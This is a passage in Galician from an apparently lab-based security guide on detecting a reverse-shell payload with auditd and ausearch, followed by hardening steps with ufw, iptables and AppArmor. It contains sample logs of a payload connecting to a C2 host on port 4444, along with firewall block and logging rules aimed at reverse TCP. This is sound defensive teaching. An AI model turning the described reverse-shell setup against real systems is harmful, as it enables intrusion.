<p>A saída buscará eventos <code>type=SYSCALL</code> coa chamada <code>connect</code> (syscall=42 en x86_64) e mostrará o PID e o nome do executábel (<code>exe=</code>). Se <code>payload_descargado.elf</code> fixo conexións de rede saíntes mentres <code>auditd</code> estaba activo coas regras cargadas, deberías velo aquí. A saída incluirá detalles sobre o socket (familia, enderezo IP/porto de destino se está dispoñible no momento da auditoría).</p>
<p><strong>Exemplo de Saída de Conexión:</strong>
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>type=SYSCALL msg=audit(1678886405.456:480): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7ff... a2=10 a3=0 items=0 ppid=1234 pid=5678 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm=&quot;payload_descarga&quot; exe=&quot;/home/usuario/payload_descargado.elf&quot; subj=... key=&quot;network_connection&quot;
</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>type=SOCKADDR msg=audit(1678886405.456:480): saddr=0200115C C0A80135 0000000000000000 // Familia AF_INET (2), Porto 4444 (0x115C), IP 192.168.120.100 (C0A80135)
</span></code></pre></div>
<em>(Neste exemplo, o proceso 5678, executando <code>payload_descargado.elf</code>, conectouse (syscall 42) a 192.168.120.100 no porto 4444).</em></p>
<div class="admonition note">
<p class="admonition-title">O comando ausearch non amosa nada</p>
<p>É unha situación común cando se traballa con logs de auditoría. Hai varias razóns polas que o comando <code>ausearch -k network_connection -i | grep 'exe="/home/losada/1743838036.elf"'</code> podería non mostrar nada, aínda que saibas que o proceso está facendo conexións:</p>
<ol>
<li>
<p><strong>O Proceso Principal Non Fai a Conexión Directamente:</strong> Moitas veces, un payload (como o teu ELF) que proporciona un shell remoto non realiza <em>todas</em> as operacións de rede directamente. Cando executas <code>ping 8.8.8.8</code> <em>dentro</em> dese shell remoto:</p>
<ul>
<li>O proceso <code>1743838036.elf</code> (o teu shell/payload) crea un <strong>novo proceso fillo</strong>, que é o comando <code>/usr/bin/ping</code>.</li>
<li>É este novo proceso <code>/usr/bin/ping</code> o que realmente fai as chamadas ao sistema <code>connect</code> (ou <code>sendto</code>/<code>recvfrom</code> para ICMP) para enviar e recibir os paquetes do ping.</li>
<li>Polo tanto, o evento de auditoría para a conexión de rede terá <code>exe="/usr/bin/ping"</code>, non <code>exe="/home/user/1743838036.elf"</code>. A conexión do <em>propio shell reverso</em> ao servidor C2 (VIPER) si debería estar asociada ao ELF inicial, pero vexamos iso despois.</li>
</ul>
</li>
<li>
<p><strong>O Campo <code>exe</code> Non Coincide Exactamente:</strong> Ás veces, a forma en que se rexistra o nome do executábel pode variar lixeiramente (p.ex., por resolución de enlaces simbólicos, ou se o proceso cambia o seu nome). O <code>grep</code> que estás usando é moi específico.</p>
</li>
<li>
<p><strong>As Regras Non Estaban Activas Cando Se Fixo a Conexión Inicial:</strong> Se o payload se executou <em>antes</em> de que as regras de auditoría para <code>connect</code> estivesen correctamente cargadas e activas (<code>augenrules --load</code>), a conexión inicial ao C2 podería non terse rexistrado.</p>
</li>
<li>
<p><strong>Buffer de Auditoría ou Atraso:</strong> Pode haber un lixeiro atraso entre o evento e a súa aparición nos logs consultables.</p>
</li>
</ol>
<p><strong>Como Solucionalo e Investigar con <code>ausearch</code>:</strong></p>
<p><strong>Paso 1: Verifica que as regras están activas</strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>auditctl<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>network_connection
</span></code></pre></div>
<p>Deberías ver as regras que definiches para a chamada ao sistema <code>connect</code> coa chave <code>network_connection</code>. Se non aparecen, recárgaas: <code>augenrules --load</code>.</p>
<p><strong>Paso 2: Busca Conexións de Rede de Forma Máis Ampla (e Recente)</strong></p>
<p>Elimina o <code>grep</code> para ver <em>todos</em> os eventos de conexión recentes e busca manualmente ou cun <code>grep</code> menos específico:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent
</span></code></pre></div>
<ul>
<li><code>-ts recent</code>: Busca eventos moi recentes (últimos 10 minutos por defecto). Podes usar <code>-ts today</code>, <code>-ts yesterday</code> ou especificar tempos exactos con <code>-ts hh:mm:ss</code>.</li>
<li>Revisa a saída. Busca <em>calquera</em> liña <code>type=SYSCALL</code> que teña <code>syscall=42</code> (connect en x86_64). Mira os campos <code>pid</code>, <code>ppid</code>, <code>comm=</code> (nome do comando), e <code>exe=</code> para cada evento.</li>
</ul>
<p><strong>Paso 3: Busca o PID do Payload e Fai a Busca por PID</strong></p>
<ol>
<li>
<p>Atopa o PID do teu payload mentres se está executando:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">1743838036</span>.elf
</span></code></pre></div>
    Ou busca o evento de creación do proceso:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>process_creation<span class="w"> </span>-x<span class="w"> </span>/home/losada/1743838036.elf<span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent
</span></code></pre></div>
    Anóta o <code>pid=</code> que aparece no evento <code>execve</code>. Supoñamos que é <code>7123</code>.</p>
</li>
<li>
<p>Busca conexións de rede feitas <em>especificamente por ese PID</em>:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-p<span class="w"> </span><span class="m">7123</span><span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent
</span></code></pre></div>
    Isto debería mostrar a conexión inicial que o teu payload fixo ao servidor C2 de VIPER (asumindo que as regras estaban activas nese momento). Examina o evento <code>SOCKADDR</code> asociado para ver a IP e porto de destino.</p>
</li>
</ol>
<p><strong>Paso 4: Busca o PID do Proceso <code>ping</code> e as Súas Conexións</strong></p>
<ol>
<li>
<p>Mentres o <code>ping 8.8.8.8</code> se está executando desde o shell de VIPER, busca o seu PID na máquina vítima:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>ps<span class="w"> </span>aux<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;ping 8.8.8.8&quot;</span>
</span></code></pre></div>
    Anóta o PID. Supoñamos que é <code>7150</code>.</p>
</li>
<li>
<p>Busca conexións de rede (ou actividade relacionada) feitas por ese PID <code>ping</code>:
    <div class="language-bash highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1"># Busca xeral por PID</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>ausearch<span class="w"> </span>-p<span class="w"> </span><span class="m">7150</span><span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="c1"># Busca específica de conexións (pode que ping use outras syscalls ademais de connect para ICMP)</span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-p<span class="w"> </span><span class="m">7150</span><span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent
</span></code></pre></div>
    Se atopas eventos para o PID <code>7150</code>, mira o campo <code>exe=</code>. Case seguro que será <code>/usr/bin/ping</code> (ou similar). Tamén podes ver o <code>ppid=</code> (Parent PID) neste evento, que debería coincidir co PID do teu payload (<code>7123</code> no noso exemplo). Isto confirma a relación pai-fillo.</p>
</li>
</ol>
<p><strong>Paso 5: Usa un Grep Máis Tolerante</strong></p>
<p>Se queres seguir usando <code>grep</code> pero sendo menos específico co campo <code>exe</code>:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>ausearch<span class="w"> </span>-k<span class="w"> </span>network_connection<span class="w"> </span>-i<span class="w"> </span>-ts<span class="w"> </span>recent<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="m">1743838036</span>.elf
</span></code></pre></div>
<p>Isto atopará o nome do ficheiro en calquera parte da liña do log, non só no campo <code>exe=</code>.</p>
<p><strong>En Resumo:</strong></p>
<p>A forma máis fiable é probablemente buscar primeiro a creación do proceso do teu payload (<code>-k process_creation</code>) para obter o seu PID, e logo usar ese PID para buscar as súas conexións de rede (<code>-k network_connection -p &lt;PID&gt;</code>). Para comandos executados <em>dentro</em> do shell (como <code>ping</code>), busca o PID dese comando específico e investiga os seus propios eventos de rede, fixándote no <code>ppid</code> para relacionalo co payload orixinal.</p>
</div>
<p><strong>5. Consideracións Adicionais</strong></p>
<ul>
<li><strong>Volume de Logs:</strong> As regras proporcionadas poden xerar moitos logs, especialmente <code>execve</code> en sistemas ocupados. En ambientes de produción, poderías querer afinar as regras (por exemplo, auditar só certos directorios, excluír usuarios/procesos de confianza, ou auditar só execucións fallidas).</li>
<li><strong>Log Rotation:</strong> Asegúrate de que a rotación de logs para <code>auditd</code> está configurada (normalmente en <code>/etc/logrotate.d/auditd</code>) para evitar que o disco se encha.</li>
<li><strong>Interpretación:</strong> A saída de <code>auditd</code> é detallada. <code>ausearch -i</code> axuda moito na interpretación. Para análises máis complexas, ferramentas como <code>aureport</code> ou a exportación a un SIEM son útiles.</li>
<li><strong>Impacto no Rendemento:</strong> A auditoría intensiva pode ter un lixeiro impacto no rendemento do sistema. Monitoriza o teu sistema despois de aplicar regras extensivas.</li>
</ul>
<p>Usando <code>auditd</code> desta maneira, podes obter un rexistro detallado da actividade dos procesos e as súas conexións de rede, o que é invaluable para a análise forense e a detección de intrusións como a execución dun payload malicioso.</p>
<h5 id="bastionado-e-mitigacion"><strong>Bastionado e Mitigación</strong></h5>
<p><strong>1. Implementar un firewall robusto:</strong></p>
<p><strong>a. ufw</strong>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>ufw
</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>ufw<span class="w"> </span><span class="nb">enable</span>
</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a>ufw<span class="w"> </span>allow<span class="w"> </span>ssh
</span><span id="__span-45-4"><a id="__codelineno-45-4" name="__codelineno-45-4" href="#__codelineno-45-4"></a>ufw<span class="w"> </span>deny<span class="w"> </span><span class="m">4444</span><span class="w">  </span><span class="c1"># Porto do ataque</span>
</span><span id="__span-45-5"><a id="__codelineno-45-5" name="__codelineno-45-5" href="#__codelineno-45-5"></a>ufw<span class="w"> </span>status
</span><span id="__span-45-6"><a id="__codelineno-45-6" name="__codelineno-45-6" href="#__codelineno-45-6"></a>ufw<span class="w"> </span>disable
</span></code></pre></div></p>
<p><strong>b. iptables</strong></p>
<ul>
<li><strong>1. Bloquear conexións Reverse TCP</strong><br />
Para bloquear conexións de reverse TCP específicas, debes identificar o porto de saída utilizado. Normalmente, ferramentas como Metasploit usan portos como <code>4444</code>, pero VIPER pode configurarse con calquera porto.</li>
</ul>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-j<span class="w"> </span>DROP
</span></code></pre></div>
<p>Se queres bloquear todas as conexións de saída a un servidor específico (por exemplo, o C2 de VIPER):
<div class="language-bash highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-d<span class="w"> </span>&lt;IP_SERVIDOR_C2&gt;<span class="w"> </span>-j<span class="w"> </span>DROP
</span></code></pre></div></p>
<ul>
<li><strong>2. Crear logs para detectar Reverse TCP</strong><br />
Crear logs detallados con <code>iptables</code> para detectar calquera conexión sospeitosa.
<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>iptables<span class="w"> </span>-A<span class="w"> </span>OUTPUT<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-j<span class="w"> </span>LOG<span class="w"> </span>--log-prefix<span class="w"> </span><span class="s2">&quot;Reverse TCP Detection: &quot;</span>
</span></code></pre></div>
Os logs poden ser visualizados con:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># dmesg | grep &#39;UFW BLOCK&#39;</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="o">[</span><span class="w"> </span><span class="m">5317</span>.987456<span class="o">]</span><span class="w"> </span><span class="o">[</span>UFW<span class="w"> </span>BLOCK<span class="o">]</span><span class="w"> </span><span class="nv">IN</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">OUT</span><span class="o">=</span><span class="w"> </span><span class="nv">MAC</span><span class="o">=</span><span class="m">08</span>:00:27:ec:52:e4:08:00:27:0c:d4:a9:08:00<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">180</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">58544</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">44780</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="o">[</span><span class="w"> </span><span class="m">5318</span>.195056<span class="o">]</span><span class="w"> </span><span class="o">[</span>UFW<span class="w"> </span>BLOCK<span class="o">]</span><span class="w"> </span><span class="nv">IN</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">OUT</span><span class="o">=</span><span class="w"> </span><span class="nv">MAC</span><span class="o">=</span><span class="m">08</span>:00:27:ec:52:e4:08:00:27:0c:d4:a9:08:00<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">180</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">58545</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">44780</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="c1"># dmesg | grep &quot;Reverse TCP Detection&quot;</span>
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="o">[</span><span class="w"> </span><span class="m">6031</span>.908612<span class="o">]</span><span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detection:<span class="w"> </span><span class="nv">IN</span><span class="o">=</span><span class="w"> </span><span class="nv">OUT</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">196</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">27356</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">59436</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="o">[</span><span class="w"> </span><span class="m">6069</span>.974689<span class="o">]</span><span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detection:<span class="w"> </span><span class="nv">IN</span><span class="o">=</span><span class="w"> </span><span class="nv">OUT</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">212</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">27357</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">59436</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span></code></pre></div></li>
</ul>
<p>Ou se estás usando <code>journalctl</code>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>journalctl<span class="w"> </span>-k<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Reverse TCP Detection&quot;</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>abr<span class="w"> </span><span class="m">04</span><span class="w"> </span><span class="m">02</span>:22:00<span class="w"> </span>nodo01<span class="w"> </span>kernel:<span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detection:<span class="w"> </span><span class="nv">IN</span><span class="o">=</span><span class="w"> </span><span class="nv">OUT</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">196</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">27356</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">59436</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>abr<span class="w"> </span><span class="m">04</span><span class="w"> </span><span class="m">02</span>:22:38<span class="w"> </span>nodo01<span class="w"> </span>kernel:<span class="w"> </span>Reverse<span class="w"> </span>TCP<span class="w"> </span>Detection:<span class="w"> </span><span class="nv">IN</span><span class="o">=</span><span class="w"> </span><span class="nv">OUT</span><span class="o">=</span>enp0s8<span class="w"> </span><span class="nv">SRC</span><span class="o">=</span><span class="m">192</span>.168.120.101<span class="w"> </span><span class="nv">DST</span><span class="o">=</span><span class="m">192</span>.168.120.100<span class="w"> </span><span class="nv">LEN</span><span class="o">=</span><span class="m">212</span><span class="w"> </span><span class="nv">TOS</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">PREC</span><span class="o">=</span>0x00<span class="w"> </span><span class="nv">TTL</span><span class="o">=</span><span class="m">64</span><span class="w"> </span><span class="nv">ID</span><span class="o">=</span><span class="m">27357</span><span class="w"> </span>DF<span class="w"> </span><span class="nv">PROTO</span><span class="o">=</span>TCP<span class="w"> </span><span class="nv">SPT</span><span class="o">=</span><span class="m">59436</span><span class="w"> </span><span class="nv">DPT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span><span class="nv">WINDOW</span><span class="o">=</span><span class="m">501</span><span class="w"> </span><span class="nv">RES</span><span class="o">=</span>0x00<span class="w"> </span>ACK<span class="w"> </span>PSH<span class="w"> </span><span class="nv">URGP</span><span class="o">=</span><span class="m">0</span>
</span></code></pre></div></p>
<div class="admonition tip">
<p class="admonition-title">Ou se estás usando <code>rsyslog</code></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>cat<span class="w"> </span>/var/log/syslog<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Reverse TCP Detection&quot;</span>
</span></code></pre></div>
</div>
<ul>
<li><strong>3. Persistencia das regras de iptables</strong><br />
Para que as regras de <code>iptables</code> persistan tras un reinicio:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>iptables-save<span class="w"> </span>&gt;<span class="w"> </span>/etc/iptables/rules.v4
</span></code></pre></div>
Para restaurar:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>iptables-restore<span class="w"> </span>&lt;<span class="w"> </span>/etc/iptables/rules.v4
</span></code></pre></div></li>
</ul>
<hr />
<p><strong>2. Uso de AppArmor para Previr a Execución de Payloads</strong></p>
<p>AppArmor é un sistema de Control de Acceso Mandatorio (MAC) para Linux que permite restrinxir as capacidades dos programas. Podemos usalo para denegar a execución de ficheiros en directorios comúns onde os atacantes adoitan escribir payloads (como <code>/tmp</code>, <code>/var/tmp</code>, ou mesmo directorios de usuario).</p>
<p>a. Instalar Utilidades de AppArmor</p>
<p>Asegúrate de ter as ferramentas necesarias instaladas:</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>apt<span class="w"> </span>update
</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>apt<span class="w"> </span>install<span class="w"> </span>apparmor-utils<span class="w"> </span>apparmor-profiles<span class="w"> </span>apparmor-profiles-extra
</span></code></pre></div>
<p>b. Crear o Ficheiro de Perfil de AppArmor</p>
<p>Crearemos un perfil personalizado en <code>/etc/apparmor.d/</code>. As barras <code>/</code> no nome do perfil substitúense por puntos <code>.</code>.</p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>nano<span class="w"> </span>/etc/apparmor.d/local.deny-execute-unsafe-paths
</span></code></pre></div>
<p>c. Engadir o Contido do Perfil</p>
<p>Pega o seguinte código no ficheiro aberto (<code>local.deny-execute-unsafe-paths</code>):</p>
<div class="language-apache highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a><span class="c"># /etc/apparmor.d/local.deny-execute-unsafe-paths</span>
</span><span id="__span-56-2"><a id="__codelineno-56-2" name="__codelineno-56-2" href="#__codelineno-56-2"></a><span class="c"># Perfil local para denegar a execución en rutas comúns de descarga/temporais</span>
</span><span id="__span-56-3"><a id="__codelineno-56-3" name="__codelineno-56-3" href="#__codelineno-56-3"></a>
</span><span id="__span-56-4"><a id="__codelineno-56-4" name="__codelineno-56-4" href="#__codelineno-56-4"></a><span class="c"># Incluír definicións globais (importante)</span>
</span><span id="__span-56-5"><a id="__codelineno-56-5" name="__codelineno-56-5" href="#__codelineno-56-5"></a><span class="c">#include &lt;tunables/global&gt;</span>
</span><span id="__span-56-6"><a id="__codelineno-56-6" name="__codelineno-56-6" href="#__codelineno-56-6"></a>
</span><span id="__span-56-7"><a id="__codelineno-56-7" name="__codelineno-56-7" href="#__codelineno-56-7"></a><span class="c"># Definir o perfil - Dálle un nome único con namespace &#39;local&#39;</span>
</span><span id="__span-56-8"><a id="__codelineno-56-8" name="__codelineno-56-8" href="#__codelineno-56-8"></a><span class="nb">profile</span><span class="w"> </span>local:deny-execute-unsafe-paths<span class="w"> </span>flags=(attach_disconnected)<span class="w"> </span>{
</span><span id="__span-56-9"><a id="__codelineno-56-9" name="__codelineno-56-9" href="#__codelineno-56-9"></a>
</span><span id="__span-56-10"><a id="__codelineno-56-10" name="__codelineno-56-10" href="#__codelineno-56-10"></a><span class="w">  </span><span class="c"># Incluír abstraccións básicas (recomendado)</span>
</span><span id="__span-56-11"><a id="__codelineno-56-11" name="__codelineno-56-11" href="#__codelineno-56-11"></a><span class="w">  </span><span class="c">#include &lt;abstractions/base&gt;</span>
</span><span id="__span-56-12"><a id="__codelineno-56-12" name="__codelineno-56-12" href="#__codelineno-56-12"></a>
</span><span id="__span-56-13"><a id="__codelineno-56-13" name="__codelineno-56-13" href="#__codelineno-56-13"></a><span class="w">  </span><span class="c"># --- Regras Principais de Denegación ---</span>
</span><span id="__span-56-14"><a id="__codelineno-56-14" name="__codelineno-56-14" href="#__codelineno-56-14"></a>
</span><span id="__span-56-15"><a id="__codelineno-56-15" name="__codelineno-56-15" href="#__codelineno-56-15"></a><span class="w">  </span><span class="c"># Denegar execución (mx) en /tmp e /var/tmp recursivamente</span>
</span><span id="__span-56-16"><a id="__codelineno-56-16" name="__codelineno-56-16" href="#__codelineno-56-16"></a><span class="w">  </span><span class="c"># m: memory map executable. Denegar para evitar técnicas de evasión comúns.</span>
</span><span id="__span-56-17"><a id="__codelineno-56-17" name="__codelineno-56-17" href="#__codelineno-56-17"></a><span class="w">  </span><span class="c"># x: Permiso de execución</span>
</span><span id="__span-56-18"><a id="__codelineno-56-18" name="__codelineno-56-18" href="#__codelineno-56-18"></a><span class="w">  </span><span class="c"># **: Coincide recursivamente con todos os ficheiros e directorios dentro</span>
